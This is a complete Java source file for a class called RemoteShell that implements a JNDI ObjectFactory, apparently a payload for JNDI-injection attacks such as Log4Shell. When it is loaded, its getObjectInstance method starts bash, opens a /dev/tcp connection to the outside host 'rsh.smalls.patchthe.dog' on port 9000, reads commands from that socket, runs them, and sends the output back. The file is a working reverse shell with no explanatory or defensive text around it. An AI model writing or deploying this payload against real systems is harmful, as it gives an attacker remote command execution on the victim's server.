import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;

public class RemoteShell implements ObjectFactory  {
    @Override
    public Object getObjectInstance (Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment)  throws Exception {
        String remoteHost = "rsh.smalls.patchthe.dog";
        String remotePort = "9000";
        String[] cmd = {
                "/bin/bash",
                "-c",
                "exec 5<>/dev/tcp/"+remoteHost+"/"+remotePort+";cat <&5 | while read line; do $line 2>&5 >&5; done" };
        Runtime.getRuntime().exec(cmd);
        return  null;
    }
}
